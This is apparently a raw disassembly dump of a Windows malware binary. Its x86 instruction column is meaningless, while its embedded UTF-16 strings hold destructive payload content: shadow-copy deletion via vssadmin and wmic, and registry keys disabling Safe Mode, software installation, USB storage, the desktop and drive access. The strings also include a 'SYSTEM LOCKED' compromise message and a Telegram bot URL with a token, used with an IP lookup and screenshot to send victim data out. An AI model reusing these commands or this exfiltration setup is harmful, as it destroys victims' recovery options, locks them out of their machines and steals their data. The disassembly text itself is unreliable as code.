  407f2e:	00 68 00             	add    %ch,0x0(%eax)
  407f31:	65 00 6c 00 6c       	add    %ch,%gs:0x6c(%eax,%eax,1)
  407f36:	00 20                	add    %ah,(%eax)
  407f38:	00 42 00             	add    %al,0x0(%edx)
  407f3b:	4c                   	dec    %esp
  407f3c:	00 4f 00             	add    %cl,0x0(%edi)
  407f3f:	43                   	inc    %ebx
  407f40:	00 4b 00             	add    %cl,0x0(%ebx)
  407f43:	45                   	inc    %ebp
  407f44:	00 44 00 01          	add    %al,0x1(%eax,%eax,1)
  407f48:	53                   	push   %ebx
  407f49:	53                   	push   %ebx
  407f4a:	00 59 00             	add    %bl,0x0(%ecx)
  407f4d:	53                   	push   %ebx
  407f4e:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  407f52:	00 4d 00             	add    %cl,0x0(%ebp)
  407f55:	5c                   	pop    %esp
  407f56:	00 43 00             	add    %al,0x0(%ebx)
  407f59:	75 00                	jne    0x407f5b
  407f5b:	72 00                	jb     0x407f5d
  407f5d:	72 00                	jb     0x407f5f
  407f5f:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  407f63:	74 00                	je     0x407f65
  407f65:	43                   	inc    %ebx
  407f66:	00 6f 00             	add    %ch,0x0(%edi)
  407f69:	6e                   	outsb  %ds:(%esi),(%dx)
  407f6a:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  407f6e:	00 6f 00             	add    %ch,0x0(%edi)
  407f71:	6c                   	insb   (%dx),%es:(%edi)
  407f72:	00 53 00             	add    %dl,0x0(%ebx)
  407f75:	65 00 74 00 5c       	add    %dh,%gs:0x5c(%eax,%eax,1)
  407f7a:	00 43 00             	add    %al,0x0(%ebx)
  407f7d:	6f                   	outsl  %ds:(%esi),(%dx)
  407f7e:	00 6e 00             	add    %ch,0x0(%esi)
  407f81:	74 00                	je     0x407f83
  407f83:	72 00                	jb     0x407f85
  407f85:	6f                   	outsl  %ds:(%esi),(%dx)
  407f86:	00 6c 00 5c          	add    %ch,0x5c(%eax,%eax,1)
  407f8a:	00 53 00             	add    %dl,0x0(%ebx)
  407f8d:	61                   	popa
  407f8e:	00 66 00             	add    %ah,0x0(%esi)
  407f91:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  407f95:	6f                   	outsl  %ds:(%esi),(%dx)
  407f96:	00 6f 00             	add    %ch,0x0(%edi)
  407f99:	74 00                	je     0x407f9b
  407f9b:	00 0f                	add    %cl,(%edi)
  407f9d:	4d                   	dec    %ebp
  407f9e:	00 69 00             	add    %ch,0x0(%ecx)
  407fa1:	6e                   	outsb  %ds:(%esi),(%dx)
  407fa2:	00 69 00             	add    %ch,0x0(%ecx)
  407fa5:	6d                   	insl   (%dx),%es:(%edi)
  407fa6:	00 61 00             	add    %ah,0x0(%ecx)
  407fa9:	6c                   	insb   (%dx),%es:(%edi)
  407faa:	00 00                	add    %al,(%eax)
  407fac:	0f 4e 00             	cmovle (%eax),%eax
  407faf:	65 00 74 00 77       	add    %dh,%gs:0x77(%eax,%eax,1)
  407fb4:	00 6f 00             	add    %ch,0x0(%edi)
  407fb7:	72 00                	jb     0x407fb9
  407fb9:	6b 00 00             	imul   $0x0,(%eax),%eax
  407fbc:	29 a0 26 0f fe 20    	sub    %esp,0x20fe0f26(%eax)
  407fc2:	00 53 00             	add    %dl,0x0(%ebx)
  407fc5:	41                   	inc    %ecx
  407fc6:	00 46 00             	add    %al,0x0(%esi)
  407fc9:	45                   	inc    %ebp
  407fca:	00 20                	add    %ah,(%eax)
  407fcc:	00 4d 00             	add    %cl,0x0(%ebp)
  407fcf:	4f                   	dec    %edi
  407fd0:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
  407fd4:	00 20                	add    %ah,(%eax)
  407fd6:	00 42 00             	add    %al,0x0(%edx)
  407fd9:	4c                   	dec    %esp
  407fda:	00 4f 00             	add    %cl,0x0(%edi)
  407fdd:	43                   	inc    %ebx
  407fde:	00 4b 00             	add    %cl,0x0(%ebx)
  407fe1:	45                   	inc    %ebp
  407fe2:	00 44 00 01          	add    %al,0x1(%eax,%eax,1)
  407fe6:	47                   	inc    %edi
  407fe7:	76 00                	jbe    0x407fe9
  407fe9:	73 00                	jae    0x407feb
  407feb:	73 00                	jae    0x407fed
  407fed:	61                   	popa
  407fee:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  407ff2:	00 69 00             	add    %ch,0x0(%ecx)
  407ff5:	6e                   	outsb  %ds:(%esi),(%dx)
  407ff6:	00 20                	add    %ah,(%eax)
  407ff8:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  407ffc:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  408000:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  408004:	00 20                	add    %ah,(%eax)
  408006:	00 73 00             	add    %dh,0x0(%ebx)
  408009:	68 00 61 00 64       	push   $0x64006100
  40800e:	00 6f 00             	add    %ch,0x0(%edi)
  408011:	77 00                	ja     0x408013
  408013:	73 00                	jae    0x408015
  408015:	20 00                	and    %al,(%eax)
  408017:	2f                   	das
  408018:	00 61 00             	add    %ah,0x0(%ecx)
  40801b:	6c                   	insb   (%dx),%es:(%edi)
  40801c:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  408020:	00 2f                	add    %ch,(%edi)
  408022:	00 71 00             	add    %dh,0x0(%ecx)
  408025:	75 00                	jne    0x408027
  408027:	69 00 65 00 74 00    	imul   $0x740065,(%eax),%eax
  40802d:	00 2d 77 00 6d 00    	add    %ch,0x6d0077
  408033:	69 00 63 00 20 00    	imul   $0x200063,(%eax),%eax
  408039:	73 00                	jae    0x40803b
  40803b:	68 00 61 00 64       	push   $0x64006100
  408040:	00 6f 00             	add    %ch,0x0(%edi)
  408043:	77 00                	ja     0x408045
  408045:	63 00                	arpl   %eax,(%eax)
  408047:	6f                   	outsl  %ds:(%esi),(%dx)
  408048:	00 70 00             	add    %dh,0x0(%eax)
  40804b:	79 00                	jns    0x40804d
  40804d:	20 00                	and    %al,(%eax)
  40804f:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  408053:	6c                   	insb   (%dx),%es:(%edi)
  408054:	00 65 00             	add    %ah,0x0(%ebp)
  408057:	74 00                	je     0x408059
  408059:	65 00 00             	add    %al,%gs:(%eax)
  40805c:	35 3d d8 be dc       	xor    $0xdcbed83d,%eax
  408061:	20 00                	and    %al,(%eax)
  408063:	53                   	push   %ebx
  408064:	00 59 00             	add    %bl,0x0(%ecx)
  408067:	53                   	push   %ebx
  408068:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  40806c:	00 4d 00             	add    %cl,0x0(%ebp)
  40806f:	20 00                	and    %al,(%eax)
  408071:	52                   	push   %edx
  408072:	00 45 00             	add    %al,0x0(%ebp)
  408075:	53                   	push   %ebx
  408076:	00 54 00 4f          	add    %dl,0x4f(%eax,%eax,1)
  40807a:	00 52 00             	add    %dl,0x0(%edx)
  40807d:	45                   	inc    %ebp
  40807e:	00 20                	add    %ah,(%eax)
  408080:	00 44 00 49          	add    %al,0x49(%eax,%eax,1)
  408084:	00 53 00             	add    %dl,0x0(%ebx)
  408087:	41                   	inc    %ecx
  408088:	00 42 00             	add    %al,0x0(%edx)
  40808b:	4c                   	dec    %esp
  40808c:	00 45 00             	add    %al,0x0(%ebp)
  40808f:	44                   	inc    %esp
  408090:	00 01                	add    %al,(%ecx)
  408092:	5b                   	pop    %ebx
  408093:	53                   	push   %ebx
  408094:	00 4f 00             	add    %cl,0x0(%edi)
  408097:	46                   	inc    %esi
  408098:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  40809c:	00 41 00             	add    %al,0x0(%ecx)
  40809f:	52                   	push   %edx
  4080a0:	00 45 00             	add    %al,0x0(%ebp)
  4080a3:	5c                   	pop    %esp
  4080a4:	00 50 00             	add    %dl,0x0(%eax)
  4080a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4080a8:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  4080ac:	00 63 00             	add    %ah,0x0(%ebx)
  4080af:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  4080b5:	5c                   	pop    %esp
  4080b6:	00 4d 00             	add    %cl,0x0(%ebp)
  4080b9:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  4080bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4080c0:	00 73 00             	add    %dh,0x0(%ebx)
  4080c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4080c4:	00 66 00             	add    %ah,0x0(%esi)
  4080c7:	74 00                	je     0x4080c9
  4080c9:	5c                   	pop    %esp
  4080ca:	00 57 00             	add    %dl,0x0(%edi)
  4080cd:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  4080d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4080d4:	00 77 00             	add    %dh,0x0(%edi)
  4080d7:	73 00                	jae    0x4080d9
  4080d9:	5c                   	pop    %esp
  4080da:	00 49 00             	add    %cl,0x0(%ecx)
  4080dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4080de:	00 73 00             	add    %dh,0x0(%ebx)
  4080e1:	74 00                	je     0x4080e3
  4080e3:	61                   	popa
  4080e4:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  4080e8:	00 65 00             	add    %ah,0x0(%ebp)
  4080eb:	72 00                	jb     0x4080ed
  4080ed:	00 15 44 00 69 00    	add    %dl,0x690044
  4080f3:	73 00                	jae    0x4080f5
  4080f5:	61                   	popa
  4080f6:	00 62 00             	add    %ah,0x0(%edx)
  4080f9:	6c                   	insb   (%dx),%es:(%edi)
  4080fa:	00 65 00             	add    %ah,0x0(%ebp)
  4080fd:	4d                   	dec    %ebp
  4080fe:	00 53 00             	add    %dl,0x0(%ebx)
  408101:	49                   	dec    %ecx
  408102:	00 00                	add    %al,(%eax)
  408104:	37                   	aaa
  408105:	3d d8 ab de 20       	cmp    $0x20deabd8,%eax
  40810a:	00 53 00             	add    %dl,0x0(%ebx)
  40810d:	4f                   	dec    %edi
  40810e:	00 46 00             	add    %al,0x0(%esi)
  408111:	54                   	push   %esp
  408112:	00 57 00             	add    %dl,0x0(%edi)
  408115:	41                   	inc    %ecx
  408116:	00 52 00             	add    %dl,0x0(%edx)
  408119:	45                   	inc    %ebp
  40811a:	00 20                	add    %ah,(%eax)
  40811c:	00 49 00             	add    %cl,0x0(%ecx)
  40811f:	4e                   	dec    %esi
  408120:	00 53 00             	add    %dl,0x0(%ebx)
  408123:	54                   	push   %esp
  408124:	00 41 00             	add    %al,0x0(%ecx)
  408127:	4c                   	dec    %esp
  408128:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40812c:	00 42 00             	add    %al,0x0(%edx)
  40812f:	4c                   	dec    %esp
  408130:	00 4f 00             	add    %cl,0x0(%edi)
  408133:	43                   	inc    %ebx
  408134:	00 4b 00             	add    %cl,0x0(%ebx)
  408137:	45                   	inc    %ebp
  408138:	00 44 00 01          	add    %al,0x1(%eax,%eax,1)
  40813c:	53                   	push   %ebx
  40813d:	53                   	push   %ebx
  40813e:	00 59 00             	add    %bl,0x0(%ecx)
  408141:	53                   	push   %ebx
  408142:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  408146:	00 4d 00             	add    %cl,0x0(%ebp)
  408149:	5c                   	pop    %esp
  40814a:	00 43 00             	add    %al,0x0(%ebx)
  40814d:	75 00                	jne    0x40814f
  40814f:	72 00                	jb     0x408151
  408151:	72 00                	jb     0x408153
  408153:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  408157:	74 00                	je     0x408159
  408159:	43                   	inc    %ebx
  40815a:	00 6f 00             	add    %ch,0x0(%edi)
  40815d:	6e                   	outsb  %ds:(%esi),(%dx)
  40815e:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  408162:	00 6f 00             	add    %ch,0x0(%edi)
  408165:	6c                   	insb   (%dx),%es:(%edi)
  408166:	00 53 00             	add    %dl,0x0(%ebx)
  408169:	65 00 74 00 5c       	add    %dh,%gs:0x5c(%eax,%eax,1)
  40816e:	00 53 00             	add    %dl,0x0(%ebx)
  408171:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408175:	76 00                	jbe    0x408177
  408177:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  40817d:	73 00                	jae    0x40817f
  40817f:	5c                   	pop    %esp
  408180:	00 55 00             	add    %dl,0x0(%ebp)
  408183:	53                   	push   %ebx
  408184:	00 42 00             	add    %al,0x0(%edx)
  408187:	53                   	push   %ebx
  408188:	00 54 00 4f          	add    %dl,0x4f(%eax,%eax,1)
  40818c:	00 52 00             	add    %dl,0x0(%edx)
  40818f:	00 0b                	add    %cl,(%ebx)
  408191:	53                   	push   %ebx
  408192:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  408196:	00 72 00             	add    %dh,0x0(%edx)
  408199:	74 00                	je     0x40819b
  40819b:	00 1d 3d d8 0c dd    	add    %bl,0xdd0cd83d
  4081a1:	20 00                	and    %al,(%eax)
  4081a3:	55                   	push   %ebp
  4081a4:	00 53 00             	add    %dl,0x0(%ebx)
  4081a7:	42                   	inc    %edx
  4081a8:	00 20                	add    %ah,(%eax)
  4081aa:	00 42 00             	add    %al,0x0(%edx)
  4081ad:	4c                   	dec    %esp
  4081ae:	00 4f 00             	add    %cl,0x0(%edi)
  4081b1:	43                   	inc    %ebx
  4081b2:	00 4b 00             	add    %cl,0x0(%ebx)
  4081b5:	45                   	inc    %ebp
  4081b6:	00 44 00 01          	add    %al,0x1(%eax,%eax,1)
  4081ba:	13 4e 00             	adc    0x0(%esi),%ecx
  4081bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4081be:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  4081c2:	00 73 00             	add    %dh,0x0(%ebx)
  4081c5:	6b 00 74             	imul   $0x74,(%eax),%eax
  4081c8:	00 6f 00             	add    %ch,0x0(%edi)
  4081cb:	70 00                	jo     0x4081cd
  4081cd:	00 17                	add    %dl,(%edi)
  4081cf:	4e                   	dec    %esi
  4081d0:	00 6f 00             	add    %ch,0x0(%edi)
  4081d3:	53                   	push   %ebx
  4081d4:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  4081d8:	00 72 00             	add    %dh,0x0(%edx)
  4081db:	74 00                	je     0x4081dd
  4081dd:	4d                   	dec    %ebp
  4081de:	00 65 00             	add    %ah,0x0(%ebp)
  4081e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4081e2:	00 75 00             	add    %dh,0x0(%ebp)
  4081e5:	00 2f                	add    %ch,(%edi)
  4081e7:	3d d8 c1 dc 20       	cmp    $0x20dcc1d8,%eax
  4081ec:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
  4081f0:	00 53 00             	add    %dl,0x0(%ebx)
  4081f3:	4b                   	dec    %ebx
  4081f4:	00 54 00 4f          	add    %dl,0x4f(%eax,%eax,1)
  4081f8:	00 50 00             	add    %dl,0x0(%eax)
  4081fb:	20 00                	and    %al,(%eax)
  4081fd:	49                   	dec    %ecx
  4081fe:	00 43 00             	add    %al,0x0(%ebx)
  408201:	4f                   	dec    %edi
  408202:	00 4e 00             	add    %cl,0x0(%esi)
  408205:	53                   	push   %ebx
  408206:	00 20                	add    %ah,(%eax)
  408208:	00 48 00             	add    %cl,0x0(%eax)
  40820b:	49                   	dec    %ecx
  40820c:	00 44 00 44          	add    %al,0x44(%eax,%eax,1)
  408210:	00 45 00             	add    %al,0x0(%ebp)
  408213:	4e                   	dec    %esi
  408214:	00 01                	add    %al,(%ecx)
  408216:	11 4e 00             	adc    %ecx,0x0(%esi)
  408219:	6f                   	outsl  %ds:(%esi),(%dx)
  40821a:	00 44 00 72          	add    %al,0x72(%eax,%eax,1)
  40821e:	00 69 00             	add    %ch,0x0(%ecx)
  408221:	76 00                	jbe    0x408223
  408223:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  408227:	00 1b                	add    %bl,(%ebx)
  408229:	4e                   	dec    %esi
  40822a:	00 6f 00             	add    %ch,0x0(%edi)
  40822d:	56                   	push   %esi
  40822e:	00 69 00             	add    %ch,0x0(%ecx)
  408231:	65 00 77 00          	add    %dh,%gs:0x0(%edi)
  408235:	4f                   	dec    %edi
  408236:	00 6e 00             	add    %ch,0x0(%esi)
  408239:	44                   	inc    %esp
  40823a:	00 72 00             	add    %dh,0x0(%edx)
  40823d:	69 00 76 00 65 00    	imul   $0x650076,(%eax),%eax
  408243:	00 2f                	add    %ch,(%edi)
  408245:	3d d8 bf dc 20       	cmp    $0x20dcbfd8,%eax
  40824a:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
  40824e:	00 49 00             	add    %cl,0x0(%ecx)
  408251:	56                   	push   %esi
  408252:	00 45 00             	add    %al,0x0(%ebp)
  408255:	20 00                	and    %al,(%eax)
  408257:	41                   	inc    %ecx
  408258:	00 43 00             	add    %al,0x0(%ebx)
  40825b:	43                   	inc    %ebx
  40825c:	00 45 00             	add    %al,0x0(%ebp)
  40825f:	53                   	push   %ebx
  408260:	00 53 00             	add    %dl,0x0(%ebx)
  408263:	20 00                	and    %al,(%eax)
  408265:	42                   	inc    %edx
  408266:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  40826a:	00 43 00             	add    %al,0x0(%ebx)
  40826d:	4b                   	dec    %ebx
  40826e:	00 45 00             	add    %al,0x0(%ebp)
  408271:	44                   	inc    %esp
  408272:	00 01                	add    %al,(%ecx)
  408274:	80 a1 3d d8 12 dd 20 	andb   $0x20,-0x22ed27c3(%ecx)
  40827b:	00 53 00             	add    %dl,0x0(%ebx)
  40827e:	59                   	pop    %ecx
  40827f:	00 53 00             	add    %dl,0x0(%ebx)
  408282:	54                   	push   %esp
  408283:	00 45 00             	add    %al,0x0(%ebp)
  408286:	4d                   	dec    %ebp
  408287:	00 20                	add    %ah,(%eax)
  408289:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  40828d:	00 43 00             	add    %al,0x0(%ebx)
  408290:	4b                   	dec    %ebx
  408291:	00 45 00             	add    %al,0x0(%ebp)
  408294:	44                   	inc    %esp
  408295:	00 20                	add    %ah,(%eax)
  408297:	00 3d d8 12 dd 0a    	add    %bh,0xadd12d8
  40829d:	00 0a                	add    %cl,(%edx)
  40829f:	00 59 00             	add    %bl,0x0(%ecx)
  4082a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4082a3:	00 75 00             	add    %dh,0x0(%ebp)
  4082a6:	72 00                	jb     0x4082a8
  4082a8:	20 00                	and    %al,(%eax)
  4082aa:	73 00                	jae    0x4082ac
  4082ac:	79 00                	jns    0x4082ae
  4082ae:	73 00                	jae    0x4082b0
  4082b0:	74 00                	je     0x4082b2
  4082b2:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  4082b6:	20 00                	and    %al,(%eax)
  4082b8:	68 00 61 00 73       	push   $0x73006100
  4082bd:	00 20                	add    %ah,(%eax)
  4082bf:	00 62 00             	add    %ah,0x0(%edx)
  4082c2:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  4082c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4082c7:	00 20                	add    %ah,(%eax)
  4082c9:	00 63 00             	add    %ah,0x0(%ebx)
  4082cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4082cd:	00 6d 00             	add    %ch,0x0(%ebp)
  4082d0:	70 00                	jo     0x4082d2
  4082d2:	72 00                	jb     0x4082d4
  4082d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4082d5:	00 6d 00             	add    %ch,0x0(%ebp)
  4082d8:	69 00 73 00 65 00    	imul   $0x650073,(%eax),%eax
  4082de:	64 00 0a             	add    %cl,%fs:(%edx)
  4082e1:	00 0a                	add    %cl,(%edx)
  4082e3:	00 41 00             	add    %al,0x0(%ecx)
  4082e6:	6c                   	insb   (%dx),%es:(%edi)
  4082e7:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  4082eb:	00 66 00             	add    %ah,0x0(%esi)
  4082ee:	75 00                	jne    0x4082f0
  4082f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4082f1:	00 63 00             	add    %ah,0x0(%ebx)
  4082f4:	74 00                	je     0x4082f6
  4082f6:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4082fc:	73 00                	jae    0x4082fe
  4082fe:	20 00                	and    %al,(%eax)
  408300:	61                   	popa
  408301:	00 72 00             	add    %dh,0x0(%edx)
  408304:	65 00 20             	add    %ah,%gs:(%eax)
  408307:	00 62 00             	add    %ah,0x0(%edx)
  40830a:	6c                   	insb   (%dx),%es:(%edi)
  40830b:	00 6f 00             	add    %ch,0x0(%edi)
  40830e:	63 00                	arpl   %eax,(%eax)
  408310:	6b 00 65             	imul   $0x65,(%eax),%eax
  408313:	00 64 00 01          	add    %ah,0x1(%eax,%eax,1)
  408317:	0b 41 00             	or     0x0(%ecx),%eax
  40831a:	72 00                	jb     0x40831c
  40831c:	69 00 61 00 6c 00    	imul   $0x6c0061,(%eax),%eax
  408322:	00 80 ef 3d d8 80    	add    %al,-0x7f27c211(%eax)
  408328:	dc 20                	fsubl  (%eax)
  40832a:	00 53 00             	add    %dl,0x0(%ebx)
  40832d:	55                   	push   %ebp
  40832e:	00 50 00             	add    %dl,0x0(%eax)
  408331:	45                   	inc    %ebp
  408332:	00 52 00             	add    %dl,0x0(%edx)
  408335:	20 00                	and    %al,(%eax)
  408337:	56                   	push   %esi
  408338:	00 49 00             	add    %cl,0x0(%ecx)
  40833b:	52                   	push   %edx
  40833c:	00 55 00             	add    %dl,0x0(%ebp)
  40833f:	53                   	push   %ebx
  408340:	00 20                	add    %ah,(%eax)
  408342:	00 41 00             	add    %al,0x0(%ecx)
  408345:	43                   	inc    %ebx
  408346:	00 54 00 49          	add    %dl,0x49(%eax,%eax,1)
  40834a:	00 56 00             	add    %dl,0x0(%esi)
  40834d:	41                   	inc    %ecx
  40834e:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  408352:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  408356:	00 3d d8 80 dc 0d    	add    %bh,0xddc80d8
  40835c:	00 0a                	add    %cl,(%edx)
  40835e:	00 01                	add    %al,(%ecx)
  408360:	25 01 25 01 25       	and    $0x25012501,%eax
  408365:	01 25 01 25 01 25    	add    %esp,0x25012501
  40836b:	01 25 01 25 01 25    	add    %esp,0x25012501
  408371:	01 25 01 25 01 25    	add    %esp,0x25012501
  408377:	01 25 01 25 01 25    	add    %esp,0x25012501
  40837d:	01 25 01 25 01 25    	add    %esp,0x25012501
  408383:	01 25 0d 00 0a 00    	add    %esp,0xa000d
  408389:	3d d8 bb dc 20       	cmp    $0x20dcbbd8,%eax
  40838e:	00 50 00             	add    %dl,0x0(%eax)
  408391:	43                   	inc    %ebx
  408392:	00 3a                	add    %bh,(%edx)
  408394:	00 20                	add    %ah,(%eax)
  408396:	00 7b 00             	add    %bh,0x0(%ebx)
  408399:	30 00                	xor    %al,(%eax)
  40839b:	7d 00                	jge    0x40839d
  40839d:	0d 00 0a 00 3d       	or     $0x3d000a00,%eax
  4083a2:	d8 64 dc 20          	fsubs  0x20(%esp,%ebx,8)
  4083a6:	00 55 00             	add    %dl,0x0(%ebp)
  4083a9:	73 00                	jae    0x4083ab
  4083ab:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4083af:	3a 00                	cmp    (%eax),%al
  4083b1:	20 00                	and    %al,(%eax)
  4083b3:	7b 00                	jnp    0x4083b5
  4083b5:	31 00                	xor    %eax,(%eax)
  4083b7:	7d 00                	jge    0x4083b9
  4083b9:	0d 00 0a 00 3e       	or     $0x3e000a00,%eax
  4083be:	d8 9f de 20 00 4f    	fcomps 0x4f0020de(%edi)
  4083c4:	00 53 00             	add    %dl,0x0(%ebx)
  4083c7:	3a 00                	cmp    (%eax),%al
  4083c9:	20 00                	and    %al,(%eax)
  4083cb:	7b 00                	jnp    0x4083cd
  4083cd:	32 00                	xor    (%eax),%al
  4083cf:	7d 00                	jge    0x4083d1
  4083d1:	0d 00 0a 00 3d       	or     $0x3d000a00,%eax
  4083d6:	d8 e1                	fsub   %st(1),%st
  4083d8:	dc 20                	fsubl  (%eax)
  4083da:	00 49 00             	add    %cl,0x0(%ecx)
  4083dd:	50                   	push   %eax
  4083de:	00 3a                	add    %bh,(%edx)
  4083e0:	00 20                	add    %ah,(%eax)
  4083e2:	00 7b 00             	add    %bh,0x0(%ebx)
  4083e5:	33 00                	xor    (%eax),%eax
  4083e7:	7d 00                	jge    0x4083e9
  4083e9:	0d 00 0a 00 01       	or     $0x1000a00,%eax
  4083ee:	25 01 25 01 25       	and    $0x25012501,%eax
  4083f3:	01 25 01 25 01 25    	add    %esp,0x25012501
  4083f9:	01 25 01 25 01 25    	add    %esp,0x25012501
  4083ff:	01 25 01 25 01 25    	add    %esp,0x25012501
  408405:	01 25 01 25 01 25    	add    %esp,0x25012501
  40840b:	01 25 01 25 01 25    	add    %esp,0x25012501
  408411:	01 25 01 2b 68 00    	add    %esp,0x682b01
  408417:	74 00                	je     0x408419
  408419:	74 00                	je     0x40841b
  40841b:	70 00                	jo     0x40841d
  40841d:	73 00                	jae    0x40841f
  40841f:	3a 00                	cmp    (%eax),%al
  408421:	2f                   	das
  408422:	00 2f                	add    %ch,(%edi)
  408424:	00 61 00             	add    %ah,0x0(%ecx)
  408427:	70 00                	jo     0x408429
  408429:	69 00 2e 00 69 00    	imul   $0x69002e,(%eax),%eax
  40842f:	70 00                	jo     0x408431
  408431:	69 00 66 00 79 00    	imul   $0x790066,(%eax),%eax
  408437:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  40843b:	72 00                	jb     0x40843d
  40843d:	67 00 00             	add    %al,(%bx,%si)
  408440:	0f 55 00             	andnps (%eax),%xmm0
  408443:	6e                   	outsb  %ds:(%esi),(%dx)
  408444:	00 6b 00             	add    %ch,0x0(%ebx)
  408447:	6e                   	outsb  %ds:(%esi),(%dx)
  408448:	00 6f 00             	add    %ch,0x0(%edi)
  40844b:	77 00                	ja     0x40844d
  40844d:	6e                   	outsb  %ds:(%esi),(%dx)
  40844e:	00 00                	add    %al,(%eax)
  408450:	1d 73 00 63 00       	sbb    $0x630073,%eax
  408455:	72 00                	jb     0x408457
  408457:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  40845b:	6e                   	outsb  %ds:(%esi),(%dx)
  40845c:	00 73 00             	add    %dh,0x0(%ebx)
  40845f:	68 00 6f 00 74       	push   $0x74006f00
  408464:	00 2e                	add    %ch,(%esi)
  408466:	00 70 00             	add    %dh,0x0(%eax)
  408469:	6e                   	outsb  %ds:(%esi),(%dx)
  40846a:	00 67 00             	add    %ah,0x0(%edi)
  40846d:	00 80 ad 68 00 74    	add    %al,0x740068ad(%eax)
  408473:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  408477:	00 73 00             	add    %dh,0x0(%ebx)
  40847a:	3a 00                	cmp    (%eax),%al
  40847c:	2f                   	das
  40847d:	00 2f                	add    %ch,(%edi)
  40847f:	00 61 00             	add    %ah,0x0(%ecx)
  408482:	70 00                	jo     0x408484
  408484:	69 00 2e 00 74 00    	imul   $0x74002e,(%eax),%eax
  40848a:	65 00 6c 00 65       	add    %ch,%gs:0x65(%eax,%eax,1)
  40848f:	00 67 00             	add    %ah,0x0(%edi)
  408492:	72 00                	jb     0x408494
  408494:	61                   	popa
  408495:	00 6d 00             	add    %ch,0x0(%ebp)
  408498:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  40849c:	72 00                	jb     0x40849e
  40849e:	67 00 2f             	add    %ch,(%bx)
  4084a1:	00 62 00             	add    %ah,0x0(%edx)
  4084a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4084a5:	00 74 00 38          	add    %dh,0x38(%eax,%eax,1)
  4084a9:	00 37                	add    %dh,(%edi)
  4084ab:	00 34 00             	add    %dh,(%eax,%eax,1)
  4084ae:	36 00 36             	add    %dh,%ss:(%esi)
  4084b1:	00 33                	add    %dh,(%ebx)
  4084b3:	00 32                	add    %dh,(%edx)
  4084b5:	00 33                	add    %dh,(%ebx)
  4084b7:	00 34 00             	add    %dh,(%eax,%eax,1)
  4084ba:	38 00                	cmp    %al,(%eax)
  4084bc:	3a 00                	cmp    (%eax),%al
  4084be:	41                   	inc    %ecx
  4084bf:	00 41 00             	add    %al,0x0(%ecx)
  4084c2:	48                   	dec    %eax
  4084c3:	00 4e 00             	add    %cl,0x0(%esi)
  4084c6:	63 00                	arpl   %eax,(%eax)
  4084c8:	33 00                	xor    (%eax),%eax
  4084ca:	75 00                	jne    0x4084cc
  4084cc:	79 00                	jns    0x4084ce
  4084ce:	74 00                	je     0x4084d0
  4084d0:	69 00 33 00 38 00    	imul   $0x380033,(%eax),%eax
  4084d6:	6a 00                	push   $0x0
  4084d8:	5a                   	pop    %edx
  4084d9:	00 30                	add    %dh,(%eax)
  4084db:	00 4d 00             	add    %cl,0x0(%ebp)
  4084de:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  4084e2:	39 00                	cmp    %eax,(%eax)
  4084e4:	4d                   	dec    %ebp
  4084e5:	00 4c 00 6e          	add    %cl,0x6e(%eax,%eax,1)
  4084e9:	00 71 00             	add    %dh,0x0(%ecx)
  4084ec:	76 00                	jbe    0x4084ee
  4084ee:	65 00 4c 00 61       	add    %cl,%gs:0x61(%eax,%eax,1)
  4084f3:	00 69 00             	add    %ch,0x0(%ecx)
  4084f6:	59                   	pop    %ecx
  4084f7:	00 62 00             	add    %ah,0x0(%edx)
  4084fa:	77 00                	ja     0x4084fc
